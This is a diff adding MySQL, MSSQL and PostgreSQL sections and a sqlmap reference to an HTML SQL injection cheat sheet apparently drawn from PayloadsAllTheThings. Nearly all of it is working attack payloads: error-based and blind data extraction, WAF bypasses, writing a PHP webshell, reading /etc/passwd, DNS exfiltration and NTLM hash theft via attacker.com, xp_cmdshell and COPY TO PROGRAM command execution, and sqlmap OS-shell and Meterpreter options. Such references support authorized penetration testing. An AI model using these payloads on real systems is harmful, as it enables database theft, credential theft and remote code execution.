@@ -269,6 +269,287 @@ ffuf -u https://target.com/login -X POST \
   -w /usr/share/seclists/Fuzzing/Databases/SQLi/sqli.auth.bypass.txt \
   -fr "Invalid\|incorrect"</code></pre>
 
+  <h2>MySQL Injection Techniques</h2>
+  <p>MySQL-specific payloads and techniques from PayloadsAllTheThings.</p>
+
+  <h3>MySQL Comments</h3>
+  <pre><code># Comment variants (useful for WAF bypass):
+#comment              -- hash comment
+/* comment */         -- C-style comment
+/*! special SQL */    -- MySQL special SQL (executed by MySQL, ignored by others)
+-- comment            -- SQL comment (note: space required after --)
+`;%00`                -- null byte (some legacy parsers)
+
+# Version-conditional execution:
+/*!50000 SELECT version() */   -- only executes on MySQL >= 5.0.0</code></pre>
+
+  <h3>MySQL Error-Based Extraction</h3>
+  <pre><code># EXTRACTVALUE error-based:
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))--
+
+# UPDATEXML error-based:
+AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+AND UPDATEXML(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--
+
+# Double query error-based:
+AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--</code></pre>
+
+  <h3>MySQL Blind Techniques</h3>
+  <pre><code># Substring equivalents for blind extraction:
+SUBSTR(database(),1,1)='a'
+SUBSTRING(database(),1,1)='a'
+MID(database(),1,1)='a'
+
+# MAKE_SET blind:
+AND MAKE_SET(1&amp;(SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1)--
+
+# LIKE blind (no quotes needed):
+AND (SELECT database()) LIKE 'a%'--
+AND (SELECT database()) LIKE 'ab%'--
+
+# REGEXP blind:
+AND (SELECT database()) REGEXP '^a'--
+
+# Time-based with conditional:
+AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+AND IF(1=1,SLEEP(5),0)--</code></pre>
+
+  <h3>MySQL Out-of-Band &amp; File Operations</h3>
+  <pre><code># Read file (requires FILE privilege):
+UNION SELECT load_file('/etc/passwd'),2,3--
+UNION SELECT load_file(0x2f6574632f706173737764),2,3--  -- hex-encoded path
+
+# Write webshell:
+UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;',2,3
+  INTO OUTFILE '/var/www/html/shell.php'--
+INTO DUMPFILE '/var/www/html/shell.php'--  -- single-row version
+
+# DNS OOB exfiltration (requires FILE privilege):
+AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))--
+AND LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT database()),0x2e61747461636b65722e636f6d5c5c61))--
+
+# Dump in one shot (DIOS) — extract all data as single string:
+UNION SELECT group_concat(0x7e,username,0x3a,password,0x7e) FROM users--</code></pre>
+
+  <h3>MySQL WAF Bypass</h3>
+  <pre><code># Alternative to information_schema (MySQL 8+):
+# sys.schema_table_statistics_with_buffer, mysql.innodb_table_stats
+SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
+
+# Alternative to VERSION():
+SELECT @@version
+SELECT @@global.version
+
+# Alternative to GROUP_CONCAT():
+SELECT JSON_ARRAYAGG(table_name) FROM information_schema.tables WHERE table_schema=database()
+
+# Scientific notation bypass (bypasses numeric filters):
+1e0 UNION SELECT...    -- 1e0 = 1
+0e0 UNION SELECT...    -- 0e0 = 0
+
+# Inline comments (MySQL version-conditional):
+UN/**/ION SEL/**/ECT 1,2,3--
+UN/*!ION*/SEL/*!ECT*/1,2,3--
+
+# Wide-byte injection (GBK encoding — %bf%27 = valid GBK char + quote):
+%bf%27 OR 1=1--    -- bypasses addslashes() on GBK-encoded connections</code></pre>
+
+  <h2>MSSQL Injection Techniques</h2>
+  <p>Microsoft SQL Server specific payloads from PayloadsAllTheThings.</p>
+
+  <h3>MSSQL Enumeration Queries</h3>
+  <pre><code>-- Version and context:
+SELECT @@version
+SELECT DB_NAME()
+SELECT CURRENT_USER
+SELECT system_user
+SELECT HOST_NAME()
+SELECT SERVERPROPERTY('productversion')
+
+-- List databases:
+SELECT name FROM master..sysdatabases
+SELECT name FROM master.sys.databases
+SELECT STRING_AGG(name, ', ') FROM master..sysdatabases  -- MSSQL 2017+
+
+-- List tables in current DB:
+SELECT name FROM sysobjects WHERE xtype='U'
+SELECT name FROM information_schema.tables WHERE table_type='BASE TABLE'
+
+-- List columns:
+SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')
+SELECT column_name FROM information_schema.columns WHERE table_name='users'</code></pre>
+
+  <h3>MSSQL Error-Based &amp; Stacked Queries</h3>
+  <pre><code>-- Error-based extraction (convert to int triggers error with data):
+AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+AND 1=CONVERT(int,DB_NAME())--
+AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--
+
+-- Stacked queries (when supported — e.g. via sqlmap or direct connection):
+'; SELECT * FROM users--
+'; EXEC xp_cmdshell('whoami')--
+'; INSERT INTO users VALUES('attacker','attacker_pass')--
+
+-- Time-based blind:
+; IF (1=1) WAITFOR DELAY '0:0:5'--
+; IF (SELECT COUNT(*) FROM users WHERE username='admin')&gt;0 WAITFOR DELAY '0:0:5'--
+; IF (ASCII(SUBSTRING(DB_NAME(),1,1))&gt;64) WAITFOR DELAY '0:0:5'--</code></pre>
+
+  <h3>MSSQL Command Execution &amp; OOB</h3>
+  <pre><code>-- Enable and use xp_cmdshell:
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'powershell -enc BASE64PAYLOAD'--
+
+-- DNS OOB exfiltration via xp_dirtree:
+'; DECLARE @v NVARCHAR(1024);
+SET @v=CONCAT('\\',@@version,'.attacker.com\a');
+EXEC xp_dirtree @v--
+
+-- UNC path (NTLM hash stealing):
+'; EXEC xp_dirtree '\\attacker.com\share'--
+'; EXEC xp_fileexist '\\attacker.com\share\file'--
+
+-- Trusted links (move laterally between linked SQL servers):
+SELECT * FROM OPENQUERY([linked_server],'SELECT @@version')
+EXEC ('xp_cmdshell ''whoami''') AT [linked_server]
+
+-- Read file:
+'; CREATE TABLE tmp(data NVARCHAR(4000));
+BULK INSERT tmp FROM 'C:\Windows\win.ini';
+SELECT data FROM tmp--</code></pre>
+
+  <h2>PostgreSQL Injection Techniques</h2>
+  <p>PostgreSQL-specific payloads from PayloadsAllTheThings.</p>
+
+  <h3>PostgreSQL Enumeration</h3>
+  <pre><code>-- Version and context:
+SELECT version()
+SELECT CURRENT_DATABASE()
+SELECT CURRENT_USER
+SELECT session_user
+
+-- List databases:
+SELECT datname FROM pg_database
+
+-- List schemas:
+SELECT DISTINCT(schemaname) FROM pg_tables
+
+-- List tables:
+SELECT table_name FROM information_schema.tables WHERE table_schema='public'
+SELECT tablename FROM pg_tables WHERE schemaname='public'
+
+-- List columns:
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+
+-- List users and password hashes:
+SELECT usename, passwd FROM pg_shadow  -- requires superuser
+SELECT usename FROM pg_user WHERE usesuper IS TRUE  -- list admins</code></pre>
+
+  <h3>PostgreSQL Error-Based Extraction</h3>
+  <pre><code>-- CAST to integer triggers verbose error with data:
+AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC)--
+AND CAST((SELECT version()) AS INT)=1337--
+
+-- XML helper — dump all data in one query:
+SELECT query_to_xml('SELECT * FROM users',true,true,'')
+-- Returns all rows as XML — chain with error-based to exfil
+
+-- CAST chain for table enumeration:
+AND CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)--
+AND CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0)||chr(126) AS NUMERIC)--</code></pre>
+
+  <h3>PostgreSQL Time-Based Blind</h3>
+  <pre><code>-- Basic sleep:
+SELECT 1 FROM pg_sleep(5)
+||(SELECT 1 FROM pg_sleep(5))
+
+-- Conditional time-based:
+SELECT CASE WHEN (SELECT current_user)='postgres' THEN pg_sleep(5) ELSE pg_sleep(0) END
+SELECT CASE WHEN SUBSTRING(current_database(),1,1)='p' THEN pg_sleep(5) ELSE pg_sleep(0) END
+AND 'RAND'||PG_SLEEP(5)='RAND'--  -- append to string parameter</code></pre>
+
+  <h3>PostgreSQL Command Execution</h3>
+  <pre><code>-- COPY TO PROGRAM (PostgreSQL 9.3+ superuser):
+COPY (SELECT '') TO PROGRAM 'id &gt; /tmp/out'
+COPY cmd FROM PROGRAM 'id'  -- requires CREATE TABLE cmd first
+
+-- Using libc (older technique):
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer LANGUAGE internal VOLATILE AS 'system';
+SELECT system('id &gt; /tmp/out');
+
+-- Large Object file read (lo_export):
+SELECT lo_import('/etc/passwd', 13371337)
+SELECT lo_get(13371337)::text
+
+-- Stacked query command execution via sqlmap:
+sqlmap -u "URL" --dbms=postgresql --technique=S --os-shell</code></pre>
+
+  <h2>SQLmap Reference</h2>
+  <p>Key SQLmap flags, tamper scripts, and advanced usage patterns from PayloadsAllTheThings.</p>
+
+  <h3>Core Usage</h3>
+  <pre><code># Full enumeration:
+sqlmap --url="https://target/?id=1" -p id --dbms=MySQL --os=Linux \
+  --banner --is-dba --users --passwords --current-user --dbs \
+  --random-agent --threads=10 --risk=3 --level=5 --eta
+
+# Load a saved HTTP request from Burp (most reliable method):
+sqlmap -r request.txt --batch --dbs
+
+# Custom injection point using wildcard:
+sqlmap -u "https://target/" --data "username=admin&password=pass" \
+  --headers="X-Forwarded-For: 127.0.0.1*"  # inject in header
+
+# Second-order injection (stored then retrieved elsewhere):
+sqlmap -r /tmp/r.txt --dbms MySQL \
+  --second-order "https://target/wishlist" -v 3
+
+# Proxy through Burp:
+sqlmap -u "https://target/?id=1" --proxy="http://127.0.0.1:8080" --batch</code></pre>
+
+  <h3>Shell Access</h3>
+  <pre><code># SQL shell (run raw SQL queries):
+sqlmap -u "https://target/?id=1" -p id --sql-shell
+
+# OS shell (execute system commands):
+sqlmap -u "https://target/?id=1" -p id --os-shell
+
+# Meterpreter session:
+sqlmap -u "https://target/?id=1" -p id --os-pwn
+
+# Write SSH key:
+sqlmap -u "https://target/?id=1" -p id \
+  --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/</code></pre>
+
+  <h3>Tamper Scripts</h3>
+  <pre><code># Apply multiple tamper scripts for WAF bypass:
+sqlmap -u "URL" --tamper=space2comment,randomcase,charunicodeescape \
+  --level=5 --risk=3 --batch
+
+# Key tamper scripts:
+# space2comment       → spaces become /**/
+# randomcase          → raNdOM cAsE keywords
+# charunicodeescape   → unicode escape sequences
+# between             → &gt; becomes NOT BETWEEN 0 AND
+# greatest            → GREATEST() instead of &gt;
+# equaltolike         → = becomes LIKE
+# unmagicquotes       → wide-char bypass for magic_quotes
+# base64encode        → base64-encodes payloads
+# apostrophemask      → replaces ' with UTF-8 fullwidth apostrophe
+# chardoubleencode    → double URL-encodes all chars
+
+# Custom tamper script template:
+# from lib.core.enums import PRIORITY
+# def tamper(payload, **kwargs):
+#     return payload.replace(' ', '/**/')
+
+# Reduce requests (when fingerprint is known):
+sqlmap -u "URL" --dbms=mysql --technique=BT --batch --no-cast</code></pre>
+
   <h2>Tools &amp; Resources</h2>
   <ul>
     <li><code>sqlmap</code> — <code>github.com/sqlmapproject/sqlmap</code></li>
